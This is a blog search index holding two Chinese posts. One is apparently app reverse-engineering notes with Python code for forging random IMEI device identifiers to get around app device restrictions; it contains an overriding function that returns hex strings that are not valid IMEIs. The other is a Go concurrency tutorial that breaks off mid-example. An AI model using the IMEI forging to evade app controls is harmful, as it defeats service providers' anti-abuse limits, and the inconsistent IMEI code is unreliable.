<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2025/03/24/app%E9%80%86%E5%90%91%E6%80%BB%E7%BB%93/"/>
      <url>/2025/03/24/app%E9%80%86%E5%90%91%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是IMEI（可自己生成）"><a href="#什么是IMEI（可自己生成）" class="headerlink" title="什么是IMEI（可自己生成）"></a>什么是IMEI（可自己生成）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IMEI（International Mobile Equipment Identity）是【国际移动设备识别码】的缩写，它是一个唯一标识符，用于识别移动设备，如手机、平板电脑等。IMEI由15位数字组成，每一位都有特定的含义</span><br><span class="line"></span><br><span class="line"># imei 规则如下 ：69b80588244673ed</span><br><span class="line">前六位（TAC）：型号核准号码，用于识别设备的制造商和设备类型。</span><br><span class="line">接下来的两位（FAC）：最终装配代码，表示设备的最终装配站。</span><br><span class="line">后面的六位（SNR）：串号，表示设备的序列号。</span><br><span class="line">最后一位（SP）：校验位，用于验证IMEI的有效性</span><br><span class="line"></span><br><span class="line"># 针对于这个，以后我们直接伪造</span><br><span class="line">可能会根据imei限制设备，所以我们直接伪造</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"># 自动生成imei代码</span><br></pre></td></tr></table></figure><h2 id="python生成imei"><a href="#python生成imei" class="headerlink" title="python生成imei"></a>python生成imei</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># 1 生成imei方法</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_imei():  # 跟useragent类似，要变换一下</span><br><span class="line">    # # 生成随机的TAC（前六位）</span><br><span class="line">    tac = &#x27;&#x27;.join(random.choices(&#x27;0123456789&#x27;, k=6))</span><br><span class="line"></span><br><span class="line">    # 生成随机的FAC（接下来的两位）</span><br><span class="line">    fac = &#x27;&#x27;.join(random.choices(&#x27;0123456789&#x27;, k=2))</span><br><span class="line"></span><br><span class="line">    # 生成随机的SNR（后面的六位）</span><br><span class="line">    snr = &#x27;&#x27;.join(random.choices(&#x27;0123456789&#x27;, k=6))</span><br><span class="line"></span><br><span class="line">    # 计算校验位</span><br><span class="line">    imei_base = tac + fac + snr</span><br><span class="line">    imei_list = [int(digit) for digit in imei_base]</span><br><span class="line">    check_digit = sum(imei_list[::-2] + [sum(divmod(d * 2, 10)) for d in imei_list[-2::-2]]) % 10</span><br><span class="line"></span><br><span class="line">    # 生成最终的IMEI</span><br><span class="line">    imei = imei_base + str((10 - check_digit) % 10)</span><br><span class="line"></span><br><span class="line">    return imei</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_imei():</span><br><span class="line">    return &quot;&quot;.join(random.choices(&#x27;0123456789abcdef&#x27;, k=15))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(generate_imei())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>go并发编程</title>
      <link href="/2025/03/05/golang%E5%8D%8F%E7%A8%8B/"/>
      <url>/2025/03/05/golang%E5%8D%8F%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="go并发编程"><a href="#go并发编程" class="headerlink" title="go并发编程"></a>go并发编程</h2><h2 id="一、协程（Goroutines）"><a href="#一、协程（Goroutines）" class="headerlink" title="一、协程（Goroutines）"></a>一、协程（Goroutines）</h2><p>在Go语言中，每一个并发的执行单元叫作一个goroutine。，我们只需要通过 go 关键字来开启 goroutine 即可。goroutine 是轻量级线程，goroutine 的调度是由 Golang 运行时进行管理的。</p><p>goroutine 语法格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go 函数名( 参数列表 )</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">(from <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">fmt.Println(from, <span class="string">&quot;:&quot;</span>, i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 假设我们有一个函数叫做 f(s)。</span></span><br><span class="line"><span class="comment">// 我们使用一般的方式调并同时运行。</span></span><br><span class="line">f(<span class="string">&quot;direct&quot;</span>)</span><br><span class="line"><span class="comment">// 使用 go f(s) 在一个 Go 协程中调用这个函数。</span></span><br><span class="line"><span class="comment">// 这个新的 Go 协程将会并行的执行这个函数调用。</span></span><br><span class="line"><span class="keyword">go</span> f(<span class="string">&quot;goroutine&quot;</span>)</span><br><span class="line"><span class="comment">// 你也可以为匿名函数启动一个 Go 协程。</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(msg <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(msg)</span><br><span class="line">&#125;(<span class="string">&quot;going&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在这两个 Go 协程在独立的 Go 协程中异步的运行，所以我们需要等它们执行结束。</span></span><br><span class="line"><span class="comment">// 这里的 Scanln 代码需要我们在程序退出前按下任意键结束。</span></span><br><span class="line"><span class="keyword">var</span> input <span class="type">string</span></span><br><span class="line">fmt.Scanln(&amp;input)</span><br><span class="line">fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"><span class="comment">// 当我们运行这个程序时，将首先看到阻塞式调用的输出，然后是两个 Go 协程的交替输出。</span></span><br><span class="line"><span class="comment">// 这种交替的情况表示 Go 运行时是以异步的方式运行协程的。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、通道（channel）"><a href="#二、通道（channel）" class="headerlink" title="二、通道（channel）"></a>二、通道（channel）</h2><p>如果说goroutine是Go语言程序的并发体的话，那么channels则是它们之间的通信机制。通道（channel）是用来传递数据的一个数据结构。</p><p>通道可用于两个 goroutine 之间通过传递一个指定类型的值来同步运行和通讯。操作符 <code>&lt;-</code> 用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ch &lt;- v    // 把 v 发送到通道 ch</span><br><span class="line">v := &lt;-ch  // 从 ch 接收数据</span><br><span class="line">           // 并把值赋给 v</span><br></pre></td></tr></table></figure><p>声明一个通道很简单，我们使用chan关键字即可，通道在使用前必须先创建：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch := make(chan int)</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通道 是连接多个 Go 协程的管道。</span></span><br><span class="line"><span class="comment">// 你可以从一个 Go 协程将值发送到通道，然后在别的 Go 协程中接收。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 使用 make(chan val-type) 创建一个新的通道。</span></span><br><span class="line"><span class="comment">// 通道类型就是他们需要传递值的类型。</span></span><br><span class="line">messages := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line"><span class="comment">// 使用 channel &lt;- 语法 发送 一个新的值到通道中。</span></span><br><span class="line"><span class="comment">// 这里我们在一个新的 Go 协程中发送 &quot;ping&quot; 到上面创建的messages 通道中。</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">messages &lt;- <span class="string">&quot;ping&quot;</span></span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">// 使用 &lt;-channel 语法从通道中 接收 一个值。</span></span><br><span class="line"><span class="comment">// 这里将接收我们在上面发送的 &quot;ping&quot; 消息并打印出来。</span></span><br><span class="line">msg := &lt;-messages</span><br><span class="line">fmt.Println(msg)</span><br><span class="line"><span class="comment">// 我们运行程序时，通过通道，消息 &quot;ping&quot; 成功的从一个 Go 协程传到另一个中。</span></span><br><span class="line"><span class="comment">// 默认发送和接收操作是阻塞的，直到发送方和接收方都准备完毕。</span></span><br><span class="line"><span class="comment">// 这个特性允许我们，不使用任何其它的同步操作，来在程序结尾等待消息 &quot;ping&quot;。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、通道缓冲区"><a href="#三、通道缓冲区" class="headerlink" title="三、通道缓冲区"></a>三、通道缓冲区</h2><p>通道可以设置缓冲区，通过 make 的第二个参数指定缓冲区大小：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch := make(chan int, 100)</span><br></pre></td></tr></table></figure><p>带缓冲区的通道允许发送端的数据发送和接收端的数据获取处于异步状态，就是说发送端发送的数据可以放在缓冲区里面，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据。</p><p>不过由于缓冲区的大小是有限的，所以还是必须有接收端来接收数据的，否则缓冲区一满，数据发送端就无法再发送数据了。</p><p><strong>注意</strong>：如果通道不带缓冲，发送方会阻塞直到接收方从通道中接收了值。如果通道带缓冲，发送方则会阻塞直到发送的值被拷贝到缓冲区内；如果缓冲区已满，则意味着需要等待直到某个接收方获取到一个值。接收方在有值可以接收之前会一直阻塞。</p><p>示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认通道是 无缓冲 的，这意味着只有在对应的接收（&lt;- chan）通道准备好接收时，才允许进行发送（chan &lt;-）。</span></span><br><span class="line"><span class="comment">// 可缓存通道允许在没有对应接收方的情况下，缓存限定数量的值。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 这里我们 make 了一个通道，最多允许缓存 2 个值。</span></span><br><span class="line">messages := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">// 因为这个通道是有缓冲区的，即使没有一个对应的并发接收方，我们仍然可以发送这些值。</span></span><br><span class="line">messages &lt;- <span class="string">&quot;buffered&quot;</span></span><br><span class="line">messages &lt;- <span class="string">&quot;channel&quot;</span></span><br><span class="line"><span class="comment">// 然后我们可以像前面一样接收这两个值。</span></span><br><span class="line">fmt.Println(&lt;-messages)</span><br><span class="line">fmt.Println(&lt;-messages)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、同步实现"><a href="#四、同步实现" class="headerlink" title="四、同步实现"></a>四、同步实现</h2><p>我们可以通过channel实现同步，如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们可以使用通道来同步 Go 协程间的执行状态。</span></span><br><span class="line"><span class="comment">// 这里是一个使用阻塞的接受方式来等待一个 Go 协程的运行结束。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(done <span class="keyword">chan</span> <span class="type">bool</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">// 这是一个我们将要在 Go 协程中运行的函数。</span></span><br><span class="line"><span class="comment">// done 通道将被用于通知其他 Go 协程这个函数已经工作完毕。</span></span><br><span class="line">fmt.Print(<span class="string">&quot;working...&quot;</span>)</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"><span class="comment">// 发送一个值来通知我们已经完工啦。</span></span><br><span class="line">done &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 运行一个 worker Go协程，并给予用于通知的通道。</span></span><br><span class="line">done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> worker(done)</span><br><span class="line"><span class="comment">// 程序将在接收到通道中 worker 发出的通知前一直阻塞。</span></span><br><span class="line">&lt;-done</span><br><span class="line"><span class="comment">// 如果你把 &lt;- done 这行代码从程序中移除，程序甚至会在 worker还没开始运行时就结束了。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="五、通道方向示例"><a href="#五、通道方向示例" class="headerlink" title="五、通道方向示例"></a>五、通道方向示例</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当使用通道作为函数的参数时，你可以指定这个通道是不是只用来发送或者接收值。</span></span><br><span class="line"><span class="comment">// 这个特性提升了程序的类型安全性。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ping</span><span class="params">(pings <span class="keyword">chan</span> &lt;- <span class="type">string</span>, msg <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">// ping 函数定义了一个只允许发送数据的通道。</span></span><br><span class="line"><span class="comment">// 尝试使用这个通道来接收数据将会得到一个编译时错误。</span></span><br><span class="line">pings &lt;- msg</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pong</span><span class="params">(pings &lt;-<span class="keyword">chan</span> <span class="type">string</span>, pongs <span class="keyword">chan</span> &lt;- <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">// pong 函数允许通道（pings）来接收数据，另一通道（pongs）来发送数据。</span></span><br><span class="line">msg := &lt;-pings</span><br><span class="line">pongs &lt;- msg</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">pings := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line">pongs := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line">ping(pings, <span class="string">&quot;passed message&quot;</span>)</span><br><span class="line">pong(pings, pongs)</span><br><span class="line">fmt.Println(&lt;-pongs)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="六、Go-遍历通道与关闭通道"><a href="#六、Go-遍历通道与关闭通道" class="headerlink" title="六、Go 遍历通道与关闭通道"></a>六、Go 遍历通道与关闭通道</h2><p>Go 通过 range 关键字来实现遍历读取到的数据，类似于与数组或切片。格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v, ok := &lt;-ch</span><br></pre></td></tr></table></figure><p>如果通道接收不到数据后 ok 就为 false，这时通道就可以使用 <strong>close()</strong> 函数来关闭。</p><h2 id="七、通道选择器（select）"><a href="#七、通道选择器（select）" class="headerlink" title="七、通道选择器（select）"></a>七、通道选择器（select）</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ch1:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">case</span> x := &lt;-ch2:</span><br><span class="line">    <span class="comment">// ...use x...</span></span><br><span class="line"><span class="keyword">case</span> ch3 &lt;- y:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>select语句的一般形式。和switch语句稍微有点相似，也会有几个case和最后的default选择支。每一个case代表一个通信操作(在某个channel上进行发送或者接收)并且会包含一些语句组成的一个语句块。一个接收表达式可能只包含接收表达式自身(译注：不把接收到的值赋值给变量什么的)，就像上面的第一个case，或者包含在一个简短的变量声明中，像第二个case里一样；第二种形式让你能够引用接收到的值。</p><p>select会等待case中有能够执行的case时去执行。当条件满足时，select才会去通信并执行case之后的语句；这时候其它通信是不会执行的。一个没有任何case的select语句写作select{}，会永远地等待下去。</p><p>示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Go 的通道选择器 让你可以同时等待多个通道操作。</span></span><br><span class="line"><span class="comment">// Go 协程和通道以及选择器的结合是 Go 的一个强大特性。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 在我们的例子中，我们将从两个通道中选择。</span></span><br><span class="line">c1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">c2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line"><span class="comment">// 各个通道将在若干时间后接收一个值，这个用来模拟例如并行的 Go 协程中阻塞的 RPC 操作</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">time.Sleep(time.Second * <span class="number">1</span>)</span><br><span class="line">c1 &lt;- <span class="string">&quot;one&quot;</span></span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">c2 &lt;- <span class="string">&quot;two&quot;</span></span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们使用 select 关键字来同时等待这两个值，并打印各自接收到的值。</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> msg1 := &lt;-c1:</span><br><span class="line">fmt.Println(<span class="string">&quot;received&quot;</span>, msg1)</span><br><span class="line"><span class="keyword">case</span> msg2 := &lt;-c2:</span><br><span class="line">fmt.Println(<span class="string">&quot;received&quot;</span>, msg2)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 我们首先接收到值 &quot;one&quot;，然后就是预料中的 &quot;two&quot;了。</span></span><br><span class="line"><span class="comment">// 注意从第一次和第二次 Sleeps 并发执行，总共仅运行了两秒左右。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="八、超时实现"><a href="#八、超时实现" class="headerlink" title="八、超时实现"></a>八、超时实现</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 超时 对于一个连接外部资源，或者其它一些需要花费执行时间的操作的程序而言是很重要的。</span></span><br><span class="line"><span class="comment">// 得益于通道和 select，在 Go中实现超时操作是简洁而优雅的。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">c1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// 在我们的例子中，假如我们执行一个外部调用，并在 2 秒后通过通道 c1 返回它的执行结果。</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">c1 &lt;- <span class="string">&quot;result 1&quot;</span></span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里是使用 select 实现一个超时操作。res := &lt;- c1 等待结果，&lt;-Time.After 等待超时时间 1 秒后发送的值。</span></span><br><span class="line"><span class="comment">// 由于 select 默认处理第一个已准备好的接收操作，如果这个操作超过了允许的 1 秒的话，将会执行超时 case。</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> res := &lt;-c1:</span><br><span class="line">fmt.Println(res)</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">1</span>):</span><br><span class="line">fmt.Println(<span class="string">&quot;timeout 1&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果我允许一个长一点的超时时间 3 秒，将会成功的从 c2接收到值，并且打印出结果。</span></span><br><span class="line">c2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">c2 &lt;- <span class="string">&quot;result 2&quot;</span></span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> res := &lt;-c2:</span><br><span class="line">fmt.Println(res)</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">3</span>):</span><br><span class="line">fmt.Println(<span class="string">&quot;timeout 2&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 运行这个程序，首先显示运行超时的操作，然后是成功接收的。</span></span><br><span class="line"><span class="comment">// 使用这个 select 超时方式，需要使用通道传递结果。</span></span><br><span class="line"><span class="comment">// 这对于一般情况是个好的方式，因为其他重要的 Go 特性是基于通道和select 的。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="九、非阻塞选择器"><a href="#九、非阻塞选择器" class="headerlink" title="九、非阻塞选择器"></a>九、非阻塞选择器</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span 